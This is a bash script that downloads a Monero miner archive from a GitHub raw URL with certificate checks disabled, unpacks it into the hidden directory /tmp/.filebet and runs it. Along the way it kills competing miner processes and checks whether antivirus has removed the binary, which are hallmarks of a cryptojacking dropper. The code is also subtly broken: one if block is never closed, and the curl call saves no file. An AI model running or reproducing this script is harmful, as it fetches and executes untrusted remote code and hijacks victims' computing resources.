#!/bin/bash

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

# command line arguments
WALLET=$1
# checking prerequisites

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type wget >/dev/null; then
  echo "ERROR: This script requires \"wget\" utility to work correctly"
  exit 1
fi

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi
killall -9 xmrig 2>/dev/null
kill -9 `ps -aux|egrep '(miner|xmrig)'|egrep -v '(grep|egrep)'|awk '{print $2}'`

cd /tmp/

echo "[*] Downloading miner"
if ! curl -k -L --progress-bar "https://raw.githubusercontent.com/anabianca92/lol/main/filebet.tar.gz"; then
  echo "ERROR: Can't curl miner"
  exit 1
fi
echo "[*] Downloading miner"
if ! wget --no-check-certificate "https://raw.githubusercontent.com/anabianca92/lol/main/filebet.tar.gz"; then
  echo "ERROR: Can't wget miner"
  exit 1
fi

echo "[*] Unpacking /tmp/filebet.tar.gz to /tmp/.filebet"
[ -d  /tmp/.filebet ] || mkdir  /tmp/.filebet
if ! tar xf /tmp/filebet.tar.gz; then
  echo "ERROR: Can't unpack miner to /tmp/.filebet"
  exit 1
fi
rm /tmp/filebet.tar.gz

echo "[*] Checking if advanced version of $HOME/moneroocean/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' /tmp/.filebet/config.json
/tmp/.filebet/filebet --help >/dev/null
if (test $? -ne 0); then
  if [ -f /tmp/.filebet/filebet ]; then
    echo "WARNING: Advanced version of miner is not functional"
  else 
    echo "WARNING: Advanced version of miner was removed by antivirus (or some other problem)"
  fi


# preparing script background work and work under reboot
exec /tmp/.filebet/filebet --config=/tmp/.filebet/config.json
echo "[*] Setup complete"
